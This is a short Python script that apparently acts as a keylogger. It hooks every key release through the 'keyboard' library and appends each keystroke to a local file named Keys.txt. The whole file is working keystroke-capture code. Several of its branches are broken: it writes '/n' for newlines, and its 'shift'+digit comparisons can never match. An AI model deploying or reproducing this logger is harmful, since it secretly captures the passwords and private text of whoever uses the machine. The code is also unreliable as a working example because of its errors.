import keyboard
report_file = open("Keys.txt","w")
def new_key(event):
    button = event.name
    if button == "space":
        button = " "
    if button == "enter":
        button = "/n" 
    if button == "tab":
        button = "/n" 
    if button == "shift"+"9":
        button = "("
    if button == "shift"+"0":
        button = ")"
    if button == "shift"+"1":
        button = "!"   
    if button == "shift"+"2":
        button = "@"
    if button == "shift"+"3":
        button = "#"
    if button == "shift"+"5":
        button = "%"
    if button == "shift"+"7":
        button = "&"   
    if button == "shift"+"8":
        button = "*"
    report_file.write(button)
    report_file.flush()
keyboard.on_release(callback=new_key)    
keyboard.wait()